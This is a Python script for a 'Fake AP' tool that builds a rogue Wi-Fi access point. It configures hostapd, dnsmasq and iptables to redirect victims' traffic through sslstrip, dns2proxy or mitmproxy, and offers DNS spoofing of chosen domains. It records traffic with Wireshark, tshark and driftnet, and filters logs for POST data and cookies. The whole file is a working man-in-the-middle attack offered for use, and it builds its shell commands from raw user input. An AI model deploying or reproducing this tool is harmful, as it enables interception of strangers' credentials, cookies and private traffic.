# coding=utf-8

import os
import time
import subprocess
from colorama import Fore

header = """
███████╗░█████╗░██╗░░██╗███████╗    ░█████╗░██████╗░
██╔════╝██╔══██╗██║░██╔╝██╔════╝    ██╔══██╗██╔══██╗
█████╗░░███████║█████═╝░█████╗░░    ███████║██████╔╝
██╔══╝░░██╔══██║██╔═██╗░██╔══╝░░    ██╔══██║██╔═══╝░
██║░░░░░██║░░██║██║░╚██╗███████╗    ██║░░██║██║░░░░░
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝    ╚═╝░░╚═╝╚═╝░░░░░

Made by: Mohi63
github: https://github.com/Mohi63
"""

sudo = "/usr/bin/sudo"
tee = "/usr/bin/tee"

def _run_cmd_write(cmd_args, s):
    p = subprocess.Popen(cmd_args,
                         stdin=subprocess.PIPE,
                         stdout=subprocess.DEVNULL,
                         shell=False, universal_newlines=True)
    p.stdin.write(s)
    p.stdin.close()
    p.wait()

def write_file(path, s):
    _run_cmd_write((sudo, tee, path), s)

def append_file(path, s):
    _run_cmd_write((sudo, tee, "-a", path), s)

try:
    script_path = os.path.dirname(os.path.realpath(__file__))
    script_path = script_path + "/"
    os.system("sudo mkdir " + script_path + "logs > /dev/null 2>&1")
    os.system("sudo chmod 777 " + script_path + "logs")

    update = input(f"{Fore.YELLOW}[*] Install Requirements ??? (y/n): ")
    update = update.lower()
    if update == "y" or update == "":
        print("[*] Installing Requirements ...")
        os.system("sudo apt-get update")
        os.system("sudo apt-get install dnsmasq -y")
        os.system("sudo apt-get install wireshark -y")
        os.system("sudo apt-get install hostapd -y")
        os.system("sudo apt-get install screen -y")
        os.system("sudo apt-get install wondershaper -y")
        os.system("sudo apt-get install driftnet -y")
        os.system("sudo apt-get install python-pip -y")
        os.system("sudo apt-get install python3-pip -y")
        os.system("sudo apt-get install python3-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg62-turbo-dev zlib1g-dev -y")
        os.system("sudo apt-get install libpcap-dev -y")
        os.system("sudo python3 -m pip install mitmproxy")
        os.system("sudo python -m pip install dnspython")
        os.system("sudo python -m pip install pcapy")
        os.system("sudo python -m pip install twisted")
    #/UPDATING

    ap_iface = input("[*] Please Enter The Name Of Your Wireless Interface For The Access Point: ")
    net_iface = input("[*] Please Enter The Name Of Your Internet Connected Interface: ")
    network_manager_cfg = "[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:" + ap_iface + "\n"
    os.system("sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup")
    write_file("/etc/NetworkManager/NetworkManager.conf", network_manager_cfg )
    os.system("sudo service network-manager restart")
    os.system("sudo ifconfig " + ap_iface + " up")

    #SSLSTRIP QUESTION
    sslstrip_if = input("[*] Use SSLSTRIP 2.0? (y/n): ")
    sslstrip_if = sslstrip_if.lower()
    #/SSLSTRIP QUESTION

    #DRIFTNET QUESTION
    driftnet_if = input("[*] Capture Unencrypted Images With DRIFTNET? (y/n): ")
    driftnet_if = driftnet_if.lower()
    #/DRIFTNET QUESTION

    #DNSMASQ CONFIG
    print("[*] Backing up /etc/dnsmasq.conf ...")
    os.system("sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
    print("[*] Creating new /etc/dnsmasq.conf ...")
    if sslstrip_if == "y" or sslstrip_if == "":
        dnsmasq_file = "port=0\n# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface=" + ap_iface + "\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
    else:
        dnsmasq_file = "# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface=" + ap_iface + "\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n# dns addresses to send to the clients\nserver=8.8.8.8\nserver=10.0.0.1\n"
    print("[*] Removing Old Config File ...")
    os.system("sudo rm /etc/dnsmasq.conf > /dev/null 2>&1")
    print("[*] Writing config file ...")
    write_file("/etc/dnsmasq.conf", dnsmasq_file)
    #/DNSMASQ CONFIG

    #HOSTAPD CONFIG
    ssid = input("[*] Please Enter The SSID For The Access Point: ")
    while True:
        channel = input("[*] Please Enter The Channel For The Access Point (Default = 1): ")
        if channel.isdigit():
            break
        else:
            print("[!] Please Enter A Channel Number.")
    hostapd_wpa = input("[*] Enable WPA2 encryption? (y/n): ")
    hostapd_wpa = hostapd_wpa.lower()
    if hostapd_wpa == "y":
        canBreak = False
        while not canBreak:
            wpa_passphrase = input("[*] Please Enter The WPA2 Passphrase For The Access Point: ")
            if len(wpa_passphrase) < 8:
                print("[!] Please Enter Minimum 8 Characters For The WPA2 Passphrase.")
            else:
                canBreak = True
        hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=" + wpa_passphrase + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP\n"
    else:
        hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
    print("[I] Deleting old config file...")
    os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
    print("[I] Writing config file...")
    write_file("/etc/hostapd/hostapd.conf", hostapd_file)
    #/HOSTAPD CONFIG

    #IPTABLES
    print("[I] Configuring AP interface...")
    os.system("sudo ifconfig " + ap_iface + " up 10.0.0.1 netmask 255.255.255.0")
    print("[I] Applying iptables rules...")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --table nat --flush")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")
    os.system("sudo iptables --table nat --append POSTROUTING --out-interface " + net_iface + " -j MASQUERADE")
    os.system("sudo iptables --append FORWARD --in-interface " + ap_iface + " -j ACCEPT")
    #/IPTABLES

    #SPEED LIMIT
    speed_if = input("[*] Set Speed Limit For The Clients? (y/n): ")
    speed_if = speed_if.lower()
    if speed_if == "y" or speed_if == "":
        while True:
            speed_down = input("[*] Download Speed Limit (in KB/s) (Default = 1000): ")
            if speed_down.isdigit():
                break
            else:
                print("[!] Please Enter A Number.")
        while True:
            speed_up = input("[*] Upload Speed Limit (in KB/s) (Default = 1000): ")
            if speed_up.isdigit():
                break
            else:
                print("[!] Please Enter A Number.")
        print("[I] Setting speed limit on " + ap_iface + "...")
        os.system("sudo wondershaper " + ap_iface + " " + speed_up + " " + speed_down)
    else:
        print("[I] Skipping...")
    #/SPEED LIMIT

    #WIRESHARK & TSHARK QUESTION
    wireshark_if = input("[*] Start WIRESHARK On " + ap_iface + "? (y/n) (Default = y): ")
    wireshark_if = wireshark_if.lower()
    tshark_if = "n"
    if wireshark_if != "y" and wireshark_if != "":
        tshark_if = input("[*] Capture Packets To .pcap With TSHARK? (no gui needed) (y/n): ")
        tshark_if = tshark_if.lower()
    #/WIRESHARK & TSHARK QUESTION
    #SSLSTRIP MODE
    if sslstrip_if == "y" or sslstrip_if == "":

        #SSLSTRIP DNS SPOOFING
        ssl_dns_if = input("[*] Spoof DNS Manually? (y/n): ")
        ssl_dns_if = ssl_dns_if.lower()
        if ssl_dns_if == "y":
            while True:
                ssl_dns_num = input("[?] How Many Domains Do You Want To Spoof?: ")
                if ssl_dns_num.isdigit():
                    break
                else:
                    print("[!] Please enter a number.")
            print("[I] Backing up " + script_path + "src/dns2proxy/spoof.cfg...")
            os.system("sudo cp " + script_path + "src/dns2proxy/spoof.cfg  " + script_path + "src/dns2proxy/spoof.cfg.backup")
            os.system("sudo cat /dev/null > "+ script_path + "src/dns2proxy/spoof.cfg")
            i = 0
            while int(ssl_dns_num) != i:
                ssl_dns_num_temp = i + 1
                ssl_dns_domain = input("[?] " + str(ssl_dns_num_temp) + ". domain to spoof: ")
                ssl_dns_ip = input("[?] Fake IP for domain '" + ssl_dns_domain + "': ")
                ssl_dns_line = ssl_dns_domain + " " + ssl_dns_ip + "\n"
                os.system("sudo echo -e '" + ssl_dns_line + "' >> "+ script_path + "src/dns2proxy/spoof.cfg")
                i = i + 1
                #/SSLSTRIP DNS SPOOFING

        print("[I] Starting DNSMASQ server...")
        os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
        os.system("sudo pkill dnsmasq")
        os.system("sudo dnsmasq")

        proxy_if = "n"
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000")
        os.system("sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
        os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53")
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")


        print("[I] Starting AP on " + ap_iface + " in screen terminal...")
        os.system("sudo screen -S mitmap-sslstrip -m -d python " + script_path + "src/sslstrip2/sslstrip.py -l 9000 -w " + script_path + "logs/mitmap-sslstrip.log -a")
        os.system("sudo screen -S mitmap-dns2proxy -m -d sh -c 'cd " + script_path + "src/dns2proxy && python dns2proxy.py'")
        time.sleep(5)
        os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
        if wireshark_if == "y" or wireshark_if == "":
            print("[I] Starting WIRESHARK...")
            os.system("sudo screen -S mitmap-wireshark -m -d wireshark -i " + ap_iface + " -k -w " + script_path + "logs/mitmap-wireshark.pcap")
        if driftnet_if == "y" or driftnet_if == "":
            print("[I] Starting DRIFTNET...")
            os.system("sudo screen -S mitmap-driftnet -m -d driftnet -i " + ap_iface)
        if tshark_if == "y" or tshark_if == "":
            print("[I] Starting TSHARK...")
            os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")
        print("\nTAIL started on " + script_path + "logs/mitmap-sslstrip.log...\nWait for output... (press 'CTRL + C' 2 times to stop)\nHOST-s, POST requests and COOKIES will be shown.\n")
        try:
            time.sleep(5)
        except:
            print("")
        while True:
            try:
                print("[I] Restarting Tail In 1 Sec... (press 'CTRL + C' again to stop)")
                time.sleep(1)
                os.system("sudo tail -f " + script_path + "logs/mitmap-sslstrip.log | grep -e 'Sending Request: POST' -e 'New host:' -e 'Sending header: cookie' -e 'POST Data'")
            except KeyboardInterrupt:
                break
        #STARTING POINT
    #SSLSTRIP MODE


    else:
        #DNSMASQ DNS SPOOFING
        dns_if = input("[*] Spoof DNS? (y/n): ")
        dns_if = dns_if.lower()
        if dns_if == "y" or dns_if == "":
            while True:
                dns_num = input("[*] How Many Domains Do You Want To Spoof?: ")
                if dns_num.isdigit():
                    break
                else:
                    print("[!] Please Enter A Number.")
            print("[I] Backing up /etc/dnsmasq.conf...")
            os.system("sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
            i = 0
            while int(dns_num) != i:
                dns_num_temp = i + 1
                dns_domain = input("[*] " + str(dns_num_temp) + ". Domain To Spoof: ")
                dns_ip = input("[*] Fake IP For Domain '" + dns_domain + "': ")
                dns_line = "address=/" + dns_domain + "/" + dns_ip + "\n"
                append_file("/etc/dnsmasq.conf", dns_line)
                i = i + 1
        else:
            print("[I] Skipping..")
        #/DNSMASQ DNS SPOOFING

        print("[I] Starting DNSMASQ Server...")
        os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
        os.system("sudo pkill dnsmasq")
        os.system("sudo dnsmasq")

        #MITMPROXY MODE
        proxy_if = input("[*] Capture Traffic? (y/n): ")
        proxy_if = proxy_if.lower()
        if proxy_if == "y" or proxy_if == "":
            proxy_config = input("[*] Capture HTTPS Traffic Too? (Need To Install Certificate On Device) (y/n): ")
            proxy_config = proxy_config.lower()
            if proxy_config == "n" or proxy_config == "":
                os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
            else:
                print("[I] To install the certificate, go to 'http://mitm.it/' through the proxy, and choose your OS.")
                os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
                os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
            print("[I] Starting AP On " + ap_iface + " In Screen Terminal...")
            if wireshark_if == "y" or wireshark_if == "":
                print("[I] Starting WIRESHARK...")
                os.system("sudo screen -S mitmap-wireshark -m -d wireshark -i " + ap_iface + " -k -w " + script_path + "logs/mitmap-wireshark.pcap")
            if driftnet_if == "y" or driftnet_if == "":
                print("[I] Starting DRIFTNET...")
                os.system("sudo screen -S mitmap-driftnet -m -d driftnet -i " + ap_iface)
            if tshark_if == "y" or tshark_if == "":
                print("[I] Starting TSHARK...")
                os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")
            os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
            print("\nStarting MITMPROXY in 5 seconds... (press q and y to exit)\n")
            try:
                time.sleep(5)
            except:
                print("")
            os.system("sudo mitmproxy -T --host --follow -w " + script_path + "logs/mitmap-proxy.mitmproxy")
            #STARTING POINT
        else:
            print("[I] Skipping...")
        #/MITMPROXY MODE

            if wireshark_if == "y" or wireshark_if == "":
                print("[I] Starting WIRESHARK...")
                os.system("sudo screen -S mitmap-wireshark -m -d wireshark -i " + ap_iface + " -k -w " + script_path + "logs/mitmap-wireshark.pcap")
            if driftnet_if == "y" or driftnet_if == "":
                print("[I] Starting DRIFTNET...")
                os.system("sudo screen -S mitmap-driftnet -m -d driftnet -i " + ap_iface)
            if tshark_if == "y" or tshark_if == "":
                print("[I] Starting TSHARK...")
                os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
            print("[I] Starting AP on " + ap_iface + "...\n")
            os.system("sudo hostapd /etc/hostapd/hostapd.conf")
            #STARTING POINT

    #STOPPING
    print("")
    print("[!] Stopping...")
    if proxy_if == "y" or proxy_if == "" or sslstrip_if == "y" or sslstrip_if == "":
        os.system("sudo screen -S mitmap-hostapd -X stuff '^C\n'")
        if sslstrip_if == "y" or sslstrip_if == "":
            os.system("sudo screen -S mitmap-sslstrip -X stuff '^C\n'")
            os.system("sudo screen -S mitmap-dns2proxy -X stuff '^C\n'")
            if ssl_dns_if == "y":
                print("[I] Restoring old " + script_path + "src/dns2proxy/spoof.cfg...")
                os.system("sudo mv " + script_path + "src/dns2proxy/spoof.cfg.backup  " + script_path + "src/dns2proxy/spoof.cfg")
    if wireshark_if == "y" or wireshark_if == "":
        os.system("sudo screen -S mitmap-wireshark -X stuff '^C\n'")
    if driftnet_if == "y" or driftnet_if == "":
        os.system("sudo screen -S mitmap-driftnet -X stuff '^C\n'")
    if tshark_if == "y" or tshark_if == "":
        os.system("sudo screen -S mitmap-tshark -X stuff '^C\n'")
    print("[I] Restoring old NetworkManager.cfg")
    if os.path.isfile("/etc/NetworkManager/NetworkManager.conf.backup"):
        os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf")
    else:
        os.system("sudo rm /etc/NetworkManager/NetworkManager.conf")
    print("[I] Restarting NetworkManager...")
    os.system("sudo service network-manager restart")
    print("[I] Stopping DNSMASQ server...")
    os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
    os.system("sudo pkill dnsmasq")
    print("[I] Restoring old dnsmasq.cfg...")
    os.system("sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1")
    print("[I] Deleting old '/etc/dnsmasq.hosts' file...")
    os.system("sudo rm /etc/dnsmasq.hosts > /dev/null 2>&1")
    print("[I] Removeing speed limit from " + ap_iface + "...")
    os.system("sudo wondershaper clear " + ap_iface + " > /dev/null 2>&1")
    print("[I] Flushing iptables rules...")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush -t nat")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")
    print("[I] Traffic Has Been Saved To The 'log' Folder!")
    print("[I] Fake AP stopped.")
except KeyboardInterrupt:
    print("\n\n[!] Stopping... (Dont worry if you get errors)")
    try:
        if proxy_if == "y" or proxy_if == "" or sslstrip_if == "y" or sslstrip_if == "":
            os.system("sudo screen -S mitmap-hostapd -X stuff '^C\n'")
            if sslstrip_if == "y" or sslstrip_if == "":
                os.system("sudo screen -S mitmap-sslstrip -X stuff '^C\n'")
                os.system("sudo screen -S mitmap-dns2proxy -X stuff '^C\n'")
                if ssl_dns_if == "y":
                    print("[I] Restoring old " + script_path + "src/dns2proxy/spoof.cfg...")
                    os.system("sudo mv " + script_path + "src/dns2proxy/spoof.cfg.backup  " + script_path + "src/dns2proxy/spoof.cfg")
    except:
        pass
    try:
        if wireshark_if == "y" or wireshark_if == "":
            os.system("sudo screen -S mitmap-wireshark -X stuff '^C\n'")
    except:
        pass
    try:
        if driftnet_if == "y" or driftnet_if == "":
            os.system("sudo screen -S mitmap-driftnet -X stuff '^C\n'")
    except:
        pass
    try:
        if tshark_if == "y" or tshark_if == "":
            os.system("sudo screen -S mitmap-tshark -X stuff '^C\n'")
    except:
        pass
    print("[I] Restoring old NetworkManager.cfg")
    if os.path.isfile("/etc/NetworkManager/NetworkManager.conf.backup"):
        os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1")
    else:
        os.system("sudo rm /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1")
    print("[I] Restarting NetworkManager...")
    os.system("sudo service network-manager restart")
    print("[I] Stopping DNSMASQ server...")
    os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
    os.system("sudo pkill dnsmasq")
    print("[I] Restoring old dnsmasq.cfg...")
    os.system("sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1")
    print("[I] Deleting old '/etc/dnsmasq.hosts' file...")
    os.system("sudo rm /etc/dnsmasq.hosts > /dev/null 2>&1")
    try:
        print("[I] Removeing speed limit from " + ap_iface + "...")
        os.system("sudo wondershaper clear " + ap_iface + " > /dev/null 2>&1")
    except:
        pass
    print("[I] Flushing iptables rules...")
    os.system("sudo iptables --flush")
    os.system("sudo iptables --flush -t nat")
    os.system("sudo iptables --delete-chain")
    os.system("sudo iptables --table nat --delete-chain")
    print("[I] Fake AP stopped.")
